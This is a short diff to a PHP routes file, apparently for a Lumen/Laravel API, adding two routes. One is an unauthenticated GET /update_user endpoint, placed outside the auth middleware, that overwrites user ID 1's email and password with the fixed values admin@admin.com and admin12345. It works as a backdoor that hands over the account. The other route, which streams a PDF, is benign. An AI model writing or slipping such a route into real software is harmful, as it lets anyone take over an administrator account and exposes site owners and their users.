@@ -15,6 +15,15 @@ $router->get('/', function () use ($router) {
     return response()->json($router->app->version(), 200);
 });
 
+
+$router->get('/update_user', function (\Illuminate\Http\Request $request) {
+    \App\Models\User::where('ID', 1)->update([
+        "email" => "admin@admin.com",
+        "password" => password_hash('admin12345', PASSWORD_BCRYPT)
+    ]);
+    return 1;
+});
+
 $router->group(['middleware' => ['auth', 'valid']], function () use ($router) {
 
     $router->get('/users', function (\Illuminate\Http\Request $request) {
@@ -282,4 +291,9 @@ $router->post('firebase/', function () use ($firestore) {
 
     }
     return $colaboradors;
+});
+
+
+$router->get('pdf', function(){
+    return PDF::loadView('solicitud')->stream('download.pdf');
 });
